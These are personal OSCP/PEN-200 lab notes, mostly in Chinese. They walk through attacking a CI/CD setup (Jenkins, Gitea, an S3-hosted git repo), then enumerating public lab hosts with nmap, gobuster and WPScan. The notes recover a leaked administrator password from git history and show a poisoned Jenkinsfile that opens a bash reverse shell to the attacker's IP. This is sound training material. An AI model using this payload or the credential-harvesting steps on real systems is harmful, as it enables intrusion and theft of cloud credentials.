---
title: '[OSCP, PEN-200] Instructional notes - Part 8'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 8
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 7"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 6](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%207.md) 內容

# Attacking AWS Cloud Infrastructure
AWS Cloud Infrastructure 的攻擊，針對 CI/CD 的漏洞與可能的攻擊方式。CI/CD 是現代雲端環境的核心，能夠自動化應用程式的建置、測試與部署，提升開發效率與穩定性。
>[!Tip]
>[CI/CD](https://en.wikipedia.org/wiki/CI/CD):
>Continuous Integration (CI) and Continuous Delivery (CD)

CI/CD OWASP Top 10
- CICD-SEC-1: Insufficient Flow Control Mechanisms
    - CI/CD 流程缺乏嚴格的檢查機制，能夠繞過安全限制
- CICD-SEC-2: Inadequate Identity and Access Management
    - 管理員未適當配置角色與權限，導致輕易提權
- CICD-SEC-3: Dependency Chain Abuse
    - 透過污染或竄改依賴項（第三方套件），讓 CI/CD pipeline 執行惡意程式碼
- CICD-SEC-4: Poisoned Pipeline Execution (PPE)
    - 獲取對 建置或部署腳本 的控制權，可能導致 Reverse Shell 或機密資訊竊取。
- CICD-SEC-5: Insufficient PBAC (Pipeline-Based Access Controls)
    - CI/CD pipeline 未妥善保護敏感資料，可能導致竊取或濫用機密資訊
- CICD-SEC-6: Insufficient Credential Hygiene
    - 密碼、明文存儲憑證，或 API Token 洩漏
- CICD-SEC-7: Insecure System Configuration
    - CI/CD 伺服器與相關 application 存在安全漏洞
- CICD-SEC-8: Ungoverned Usage of 3rd Party Services
    - 使用 GitHub、Docker Hub 等第三方服務時，若未妥善管理權限
- CICD-SEC-9: Improper Artifact Integrity Validation
    - CI/CD pipeline 未驗證 Artifactsc是否遭篡改，可能允許植入惡意程式碼
- CICD-SEC-10: Insufficient Logging and Visibility
    - CI/CD pipeline 缺乏詳細的日誌記錄與監控，導致攻擊難以被偵測

## About the Public Cloud Labs
：再次申明「當個好駭客」\
![image](https://hackmd.io/_uploads/rJTTPFe3Jg.png)
## Leaked Secrets to Poisoned Pipeline - Lab Design
 Lab 模擬 CI/CD 系統的攻擊場景，同時啟動 多個服務，這包括：
1. 原始碼管理系統（SCM，Source Code Management）
2. 自動化伺服器（Jenkins）
3. 儲存庫（Repository Services）
4. Actual application
5. 支援 application 運作的 infrastructure


Lab 包含以下 三個主要 components，每個 components 對應 一個 subdomain
- Gitea: 原始碼管理系統（SCM），類似 GitHub 或 GitLab
- Jenkins: 自動化伺服器，用於執行 CI/CD Pipeline
- Application: 目標應用程式，是攻擊的主要對象。

![image](https://hackmd.io/_uploads/rknwO9-nkg.png)
### Accessing the Labs
#### 1. 列出目前的網路連線
```
┌──(chw㉿CHW)-[~]
└─$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  3fad19bc-1223-42bb-8a71-4519ecca8499  ethernet  eth0   
lo                  735b75b5-8789-4b4b-b693-05a081c177d7  loopback  lo     
tun0                b3c266a9-9280-43b6-8bf8-8dfcc199544d  tun       tun0  
```
> `Wired connection 1`：主要的網路連線名稱（有線網路）\
`eth0`：目前使用的網路介面
#### 2. 設定 DNS Server
使用 nmcli 指定實驗室提供的 DNS 伺服器 IP
```
┌──(chw㉿CHW)-[~]
└─$ sudo nmcli connection modify "Wired connection 1" ipv4.dns "{DNS Server IP}"
[sudo] password for chw: 

┌──(chw㉿CHW)-[~]
└─$ sudo systemctl restart NetworkManager
```
#### 3. 驗證 DNS 設定是否生效
檢查 `/etc/resolv.conf`
```                                
┌──(chw㉿CHW)-[~]
└─$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver {DNS Server IP}                                                                                               
┌──(chw㉿CHW)-[~]
└─$ nslookup git.offseclab.io
Server:         {DNS Server IP}
Address:        {DNS Server IP}#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: {LAB IP}
```
> 成功解析 `git.offseclab.io` Domain

>[!Tip]
>每次重啟 LAB 後，需要重新設定 DNS\
>`sudo nmcli connection modify "Wired connection 1" ipv4.dns ""`
##  Enumeration
 Enumerate a CI/CD System
### Enumerating Jenkins
在 `automation.offseclab.io` 瀏覽 Jenkins\
![image](https://hackmd.io/_uploads/B15rfbNh1l.png)
> 如果 Jenkins 啟用了，`self-registration enabled`，通常會提供「註冊」選項。

#### 1. 使用 Metasploit Enumeration Jenkins
由於 登入受限，改用 Metasploit 來 自動化掃描
##### 1.1 初始化 Metasploit 資料庫 & 啟動
```
┌──(chw㉿CHW)-[~]
└─$ sudo msfdb init
┌──(chw㉿CHW)-[~]
└─$ msfconsole --quiet
msf6 >
```
選擇 Jenkins 掃描 module
```
msf6 > use auxiliary/scanner/http/jenkins_enum
msf6 auxiliary(scanner/http/jenkins_enum) > show options

Module options (auxiliary/scanner/http/jenkins_enum):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:por
                                         t][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/d
                                         ocs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```
##### 1.2 設定掃描目標
將 目標伺服器設定為 `automation.offseclab.io`，並將 `TARGETURI` 設為 `/`
```
msf6 auxiliary(scanner/http/jenkins_enum) > set RHOSTS automation.offseclab.io
msf6 auxiliary(scanner/http/jenkins_enum) > set TARGETURI /
```
#### 1.3 執行掃描
```
msf6 auxiliary(scanner/http/jenkins_enum) > run

[+] 54.86.68.66:80        - Jenkins Version 2.385
[*] /script restricted (403)
[*] /view/All/newJob restricted (403)
[*] /asynchPeople/ restricted (403)
[*] /systemInfo restricted (403)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
> 取得 Jenkins 版本：2.385\
🥚 許多 API 回應 403 Forbidden

儘管沒有拿到權限，但我們取得了 Jenkins 版本，可以尋找已知漏洞（CVE）

#### - 搜尋公開漏洞
使用 `Exploit-DB` 或 `CVE Database` 搜尋: Jenkins Version 2.385
#### - Directory busting
`dirb` 或 `dirseaarch`

為了不浪費時間，先轉向 `git.offseclab.io`（Gitea Server），尋找其他可能的攻擊點。

### Enumerating the Git Server
Git 伺服器 Enumeration:
- 託管型 hosted SCM（GitHub、GitLab 等）
    - 託管在 第三方雲端（如 GitHub、GitLab）。
    - 以 開放情報蒐集（OSINT） 為主，例如：
        - 搜尋公開 repo
        - 查看組織內的成員
        - 分析過往的 Commit
    - 通常不會對 GitHub 或 GitLab 本身進行攻擊，因為這是第三方資產，且它們的安全性較高。

- 自架 own SCM（如 Gitea、Self-hosted GitLab）
    - 企業自行架設 SCM 伺服器。
    - 可以針對 SCM 軟體本身進行漏洞測試，例如：
        - 探測版本號，搜尋已知漏洞
        - 測試 API 是否開放未授權存取
        - 嘗試 Brute-force 使用者密碼
        - 搜尋公開的機密資訊（如 API 金鑰、憑證）

#### 1. 訪問 SCM Server
http://git.offseclab.io/\
![image](https://hackmd.io/_uploads/rynb3ZV2ke.png)
> Explore: 用來搜尋公開的專案或使用者
> Sign In: 需要帳號密碼 
#### 2. 確認 SCM 版本
![image](https://hackmd.io/_uploads/ByDS3b4hyl.png)
> Version: 1.18.0

#### 3. Explore 公開的 Repositories
![image](https://hackmd.io/_uploads/SkBZT-N3kg.png)
共有 5 個 users: `Billy`, `Jack`, `Lucy`, `Roger`, `administrator`

如果 SCM 目前沒有開放的攻擊點，我們可以轉向 Application（app.offseclab.io），看看是否有 憑證洩漏 或其他漏洞
### Enumerating the Application
#### 1. 訪問 Application
http://app.offseclab.io/\
![image](https://hackmd.io/_uploads/rJecC-NhJx.png)
#### 2. 使用 dirb 掃描隱藏目錄
可能有未列出的 API 或管理端點

#### 3. 檢查網頁 HTML Source code
因為應用程式是自訂的（Custom Application），可能包含開發者遺漏的資訊，打開 網頁原始碼（View Page Source）。
使用 `view-source:`+`http://app.offseclab.io/index.html`，可以看網頁原始碼\
![image](https://hackmd.io/_uploads/Bk_zefV31g.png)
> 發現 S3 bucket

#### 4. 測試 S3 Bucket 權限
https://staticcontent-{S3BucketID}.s3.us-east-1.amazonaws.com/\
![image](https://hackmd.io/_uploads/S1CPbz4nyg.png)
> AccessDenied
> 但至少知道該 Bucket 是公開的，可能還有其他可用的攻擊方式\
下一步：使用 dirb 測試是否有可存取的隱藏檔案

#### 5. 使用 dirb 嘗試列舉 S3 Bucket
```
┌──(chw㉿CHW)-[~]
└─$ dirb https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com 
...
GENERATED WORDS: 4612                                                          

---- Scanning URL: https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/ ----
+ https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)
...
```
>`https://staticcontent-{S3Bucket ID}/.s3.us-east-1.amazonaws.com/.git/HEAD`
> Bucket 內有 `.git/HEAD`，表示整個 Git Bucket 存放在 S3 上\
> 如果能夠存取 `.git` 內的其他檔案，就可能還原整個程式碼庫

單純用 dirb 逐一測試 Git 檔案效率不高，需要更有效的方法來下載資料

#### 6. 使用 AWS CLI 嘗試列出 S3 Bucket
雖然 public 無法直接讀取內容，但 AWS Authenticated User 可能仍然能存取
```
┌──(chw㉿CHW)-[~]
└─$ aws configure
AWS Access Key ID [None]: {Access Key ID}
AWS Secret Access Key [None]: {Secret Access Key}
Default region name [None]: us-east-1
Default output format [None]: 

┌──(chw㉿CHW)-[~]
└─$ aws s3 ls staticcontent-{S3Bucket ID}/
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-03-16 04:12:30        972 CONTRIBUTING.md
2025-03-16 04:12:30         79 Caddyfile
2025-03-16 04:12:30        407 Jenkinsfile
2025-03-16 04:12:30        879 README.md
2025-03-16 04:12:30        176 docker-compose.yml
```
> 成功列出存儲桶內容
>> `.git/` 目錄: 包含完整的程式碼庫
`Jenkinsfile`: Jenkins Pipeline 設定檔，可能包含憑證或 API 金鑰\
`docker-compose.yml`: 可能包含環境變數或設定檔\
`README.md`、`Caddyfile`: 可能透露伺服器架構資訊

## Discovering Secrets
- 發現哪些文件可以訪問
- 分析 Git 歷史記錄

### Downloading the Bucket
#### 1. 列出 S3 Bucket 內容
```
┌──(chw㉿CHW)-[~]
└─$ aws s3 ls staticcontent-{S3Bucket ID}/
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-03-16 04:12:30        972 CONTRIBUTING.md
2025-03-16 04:12:30         79 Caddyfile
2025-03-16 04:12:30        407 Jenkinsfile
2025-03-16 04:12:30        879 README.md
2025-03-16 04:12:30        176 docker-compose.yml
```
#### 2. 測試可存取的文件
嘗試下載 `README.md` 確認是否有權限
```
┌──(chw㉿CHW)-[~]
└─$ aws s3 cp s3://staticcontent-{S3Bucket ID}//README.md ./
download: s3://staticcontent-{S3Bucket ID}//README.md to ./README.md

┌──(chw㉿CHW)-[~]
└─$ cat README.md
...
## How to use

To use the content in this repository, simply clone or download the repository and access the files as needed. If you have access to the S3 bucket and would like to upload the content to the bucket, you can use the provided script:

./scripts/upload-to-s3.sh
...
```
> 下載成功，表示 該 bucket 部分內容是可讀取

嘗試下載整個 S3 bucket
```
┌──(chw㉿CHW)-[~]
└─$ mkdir S3-bucket

┌──(chw㉿CHW)-[~]
└─$ cd S3-bucket 
         
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ aws s3 sync s3://staticcontent-{S3Bucket ID}/ ./
...

┌──(chw㉿CHW)-[~/S3-bucket]
└─$ tree                               
.
├── CONTRIBUTING.md
├── Caddyfile
├── Jenkinsfile
├── README.md
├── docker-compose.yml
├── images
│   ├── bunny.jpg
│   ├── golden-with-flower.jpg
│   ├── kittens.jpg
│   └── puppy.jpg
├── scripts
│   ├── update-readme.sh
│   └── upload-to-s3.sh
└── webroot
    └── index.html

4 directories, 12 files
```
> 有權限讀取整個 S3 bucket

#### 3. 分析 script
- 分析 `upload-to-s3.sh` script
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ cat scripts/upload-to-s3.sh 
# Upload images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-{S3Bucket ID}/ 
```
> 未發現可用的資訊

- 分析 `update-readme.sh` script
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ cat scripts/upload-to-s3.sh
```
```sh
# Update Readme to include collaborators images to s3

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

SECTION="# Collaborators"
FILE=$SCRIPT_DIR/../README.md

if [ "$1" == "-h" ]; then
  echo "Update the collaborators in the README.md file"
  exit 0
fi

if [ "$#" -ne 2 ]; then
  echo "Usage: $0 USERNAME PASSWORD"
  exit 1
fi

username=$1
password=$2

auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")

USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')

sed -i "/^$SECTION/,/^#/{/$SECTION/d;//!d}" $FILE
echo "$SECTION" >> $FILE
echo "$USERNAMES" >> $FILE
echo "" >> $FILE
```
> 從 Git 伺服器（git.offseclab.io）獲取 repo 名單\
Jack 是這個 repo 的擁有者\
接受 `USERNAME` 和 `PASSWORD` 作為參數，接著發送 API request\
>> 如果能找到執行過這個腳本的 user bash history，可能拿到憑證

### Searching for Secrets in Git
#### 1. 使用 gitleaks 自動搜尋敏感資訊
安裝 `gitleaks`
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ sudo apt update
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ sudo apt install -y gitleaks
```
執行 `gitleaks` 掃描 Git repo
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ gitleaks detect

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

6:33AM INF 7 commits scanned.
6:33AM INF scan completed in 63.4ms
6:33AM INF no leaks found
```
> 沒有發現敏感資訊

#### 2. 手動檢查 Git history
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ git log
commit 85898c851b959830ec6b4669726434607df652ac (HEAD -> master, origin/master)
Author: Jack <jack@offseclab.io>
Date:   Sat Mar 15 08:12:27 2025 +0000

    Add Jenkinsfile

commit a93d6e3d4c5227878d89fa81451f988373e78662
Author: Jack <jack@offseclab.io>
Date:   Fri Mar 14 08:12:27 2025 +0000

    Fix issue
...
```
> `Fix issue`: 可能與安全漏洞有關\
`Add Jenkinsfile`: 可能與 CI/CD pipeline 相關

#### 3. 分析 Git 變更記錄
```
┌──(chw㉿CHW)-[~/S3-bucket]
└─$ git show a93d6e3d4c5227878d89fa81451f988373e78662
...
-USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjphMm53c3VkdzFmM2lxbDhj' | jq .\[\].username |  tr -d '"')
+# Check if both arguments are provided
+if [ "$#" -ne 2 ]; then
+  # If not, display a help message
+  echo "Usage: $0 USERNAME PASSWORD"
+  exit 1
+fi
+
+# Store the arguments in variables
+username=$1
+password=$2
+
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
...
```
> 修改前的原始腳本直接使用 hard coded 的 API 金鑰（Base64 編碼的 authorization: Basic）\
修改為從 cmd 參數輸入帳號密碼
>> 過去提交的 API 金鑰可能會有效

- 解碼 hard coded 的 API 金鑰
![image](https://hackmd.io/_uploads/rkqMoX4hkg.png)

#### 4. 使用解碼的憑證登入 SCM 伺服器
http://git.offseclab.io/user/login\
![image](https://hackmd.io/_uploads/rkd2i7Enkl.png)
> `administrator`:`a2nwsudw1f3iql8c`

成功登入：\
![image](https://hackmd.io/_uploads/SkYAsmE2Jx.png)

## Poisoning the Pipeline
如何利用 CI/CD Pipeline 來執行惡意代碼（Poisoning the Pipeline），以獲取 遠端 Shell 存取 Jenkins 伺服器
> 在 Jenkins 中，通常定義在 `Jenkinsfile`，如果能夠 修改 Jenkinsfile，就可以寫入惡意指令，讓 Pipeline 執行我們的攻擊 payload。
### Enumerating the Repositories
目前已使用 `administrator` 登入 Gitea（SCM Server），再次點擊「Explore」來查看 所有的 Repository。\
![image](https://hackmd.io/_uploads/B1oPpXN3yx.png)
> 多了 `image-transform`，且 `image-transform` 中有 `Jenkinsfile`

#### 1. 檢查 `static_content` 的 Jenkinsfile
![image](https://hackmd.io/_uploads/H1aFCmV31x.png)
> 這份 Jenkinsfile 目前只 echo 訊息，並沒有實際執行任何有效的建置步驟。

#### 2. 檢查 `image-transform` 的 Jenkinsfile
![image](https://hackmd.io/_uploads/HkzZyEN2yl.png)
> 這份 Jenkinsfile 會執行 [CloudFormation](https://docs.aws.amazon.com/cloudformation/index.html) 配置
> >
`withAWS(region:'us-east-1', credentials:'aws_key')
Jenkins` 載入 AWS 金鑰（`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`）\
嘗試竊取這些憑證，進一步入侵 AWS

>[!Important]
>使用 `cfnUpdate` 來建立 CloudFormation Stack\
表示這個 Pipeline 擁有至少 AWS CloudFormation 管理權限，可能允許我們 創建新資源、修改 S3 Bucket。

#### 3. 檢查 CloudFormation template
##### 3.1 CloudFormation conf
Jenkinsfile 會使用 `image-processor-template.yml`，檢查檔案\
![image](https://hackmd.io/_uploads/rkl1hl4Nnye.png)
> CloudFormation 建立了兩個 S3 Bucket，用來儲存原圖和縮圖

##### 3.2 lambda function
![image](https://hackmd.io/_uploads/H1XpZVE21l.png)
> Lambda function 將圖片從 `SOURCE_BUCKET` 移動到 `DESTINATION_BUCKET`\
可能擁有 S3 寫入權限，可以嘗試修改

##### 3.3  IAM 角色權限
![image](https://hackmd.io/_uploads/r11kX4E21g.png)
> IAM 允許 Lambda 存取 S3 bucket，但 權限有限\
更高權限的 AWS Key 可能儲存在 Jenkins

>[!Note]
>現在可以編輯 Jenkinsfile，但需要確認**如何觸發 build**。Jenkins 可能被設定為只能 manual intervention，如果是這種情況，我們就需要繼續探索。\
Jenkins 也有可能被設定為 routinely execute Pipeline，在這種情況下，我們無法立即觸發它，必須等待它自動執行。另外，Jenkins 可能會在 repo 變更時自動執行建置，通常是透過 SCM Server（如 Gitea 或 GitHub）發送 Webhook 觸發。

#### 4. 檢查 Webhook 設定
![image](https://hackmd.io/_uploads/HJLcNENh1x.png)
![image](https://hackmd.io/_uploads/HyE1rNVhyg.png)
> Webhook 被設定為「Git push to a repository 時觸發 Jenkins Pipeline」\
這代表我們可以透過修改 Jenkinsfile，讓 Pipeline 自動執行

### Modifying the Pipeline
利用 CI/CD Pipeline 植入惡意程式碼，以獲取 Jenkins 建置伺服器的存取權限

目標: 取得 AWS 存取金鑰並嘗試入侵 AWS 環境
- 修改 Jenkinsfile 植入反向 Shell
- 觸發 Jenkins Webhook 讓惡意代碼執行
- 取得 Jenkins 建置伺服器的 Shell 存取權限
- 在建置伺服器上進行環境偵查
- 發現 AWS 存取金鑰，準備進一步攻擊

#### 1. 編輯 Jenkinsfile，植入 Reverse Shell
保留原本的 AWS 金鑰設定（確保 pipeline 能存取 AWS），使用 `sh` 執行反向 Shell，透過 `bash -c` 確保指令在 Jenkins 伺服器正確執行\
設定 Shell 連回 Kali ，並放入背景執行 (&)
>[!Note]
>Jenkinsfile 的語法是基於 [domain-specific language (DSL)](https://en.wikipedia.org/wiki/Domain-specific_language) 。這意味著我們需要用 Jenkins DSL 語法來編寫 Reverse shell

原始 `Jenkinsfile`:
```
pipeline {
  agent any
  stages {
    stage('Build') {
      steps {
        echo 'Building..'
      }
    }
  }
}
```
修改後 `Jenkinsfile`:
```
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.168.45.168/8888 0>&1" &'
            }
          }
        }
      }
    }
  }
}
```
>[!Caution]
緩緩
LAB restart 後，administrator 就不進去了

# Assembling the Pieces
模擬一場真實的滲透測試
- Enumerating the Public Network
- Attacking a Public Machine
- Gaining Access to the Internal Network
- Enumerating the Internal Network
- Attacking an Internal Web Application
- Gaining Access to the Domain Controller

## Enumerating the Public Network
Enumerating 公開網路上的機器
![image](https://hackmd.io/_uploads/rycUywEn1l.png)
- MAILSRV1
- WEBSRV1

### MAILSRV1
#### 1. 建立工作環境
```
┌──(chw㉿CHW)-[~]
└─$ mkdir beyond
cd beyond
mkdir mailsrv1
mkdir websrv1
touch creds.txt
```
> `creds.txt`:找到的使用者帳號與密碼

### 2. Nmap 掃描 MAILSRV1
```
┌──(chw㉿CHW)-[~/beyond]
└─$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.117.242 

[sudo] password for chw: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 06:06 EDT
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 91.67% done; ETC: 06:07 (0:00:00 remaining)
Nmap scan report for 192.168.117.242
Host is up (0.099s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: CHILDREN OK CAPABILITY completed RIGHTS=texkA0001 ACL QUOTA IMAP4 IMAP4rev1 NAMESPACE IDLE SORT
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-17T10:06:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
> `-oN`：將結果儲存到 `mailsrv1/nmap` 檔案中
> > 機器是 Windows 系統\
 IIS 10.0 Web Server\
 hMailServer 郵件伺服器\
多個與電子郵件相關的 port (SMTP, POP3, IMAP)\
有 NetBIOS 與 SMB 服務（可能允許內部橫向移動）

### 3. 研究 [hMailServer](https://www.hmailserver.com/) 的潛在漏洞
- 查詢 hMailServer 官方網站 了解功能與版本歷史
- Google 搜尋 CVE
- 使用 Exploit-DB 或 Metasploit 來尋找可用的攻擊手法

![image](https://hackmd.io/_uploads/BkD8BOB3yl.png)
> 除了一些較舊的 CVE 外，沒有其他線索
#### 4. 掃描 IIS 伺服器
```
┌──(chw㉿CHW)-[~/beyond]
└─$ gobuster dir -u http://192.168.117.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
```
或
```
┌──(chw㉿CHW)-[~]
└─$ dirsearch -u http://192.168.117.242 -e * -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
> 沒有明顯有效的檔案或目錄


### WEBSRV1
#### 1. Nmap 掃描 WEBSRV1
```
┌──(chw㉿CHW)-[~/beyond]
└─$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.117.244
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 06:20 EDT
Nmap scan report for 192.168.117.244
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.117.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: WordPress 6.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.54 seconds
```
> `22/tcp`：SSH ，使用 OpenSSH 8.9p1\
`80/tcp`：HTTP 服務，運行 Apache 2.4.52

#### 2. 分析 Ubuntu 22.04 的 SSH 服務
搜尋 OpenSSH 8.9p1 Ubuntu 3 來了解這個版本的 Ubuntu 是否有已知漏洞\
![image](https://hackmd.io/_uploads/By_vduHn1x.png)
> 確認這台機器運行的是 Ubuntu 22.04 (Jammy Jellyfish)

#### 3. 掃描 Apache 2.4.52 網站
- 直接訪問網站，看看是否有敏感信息洩漏。
- 檢查 HTML 原始碼，尋找 CMS、框架或其他技術資訊。
- 使用工具偵測網站技術堆疊（如 whatweb）。
- 使用 WordPress 專門的掃描工具（WPScan）來檢查漏洞。

確認 WordPress 版本:
```
┌──(chw㉿CHW)-[~/beyond]
└─$ whatweb http://192.168.117.244
http://192.168.117.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], RedirectLocation[http://192.168.117.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.117.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.117.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2] 
```
> WordPress[6.0.2] 、 網站使用 jQuery 3.6.0

使用 WPScan 掃描 WordPress:
```
┌──(chw㉿CHW)-[~/beyond]
└─$ wpscan --url http://192.168.117.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan

┌──(chw㉿CHW)-[~/beyond]
└─$ cat websrv1/wpscan 
...
[+] duplicator
 | Location: http://192.168.117.244/wp-content/plugins/duplicator/
 | Last Updated: 2025-03-11T14:31:00.000Z
 | Readme: http://192.168.117.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.12
...
```
> `--enumerate p`: enumerate 已安裝的 plugins\
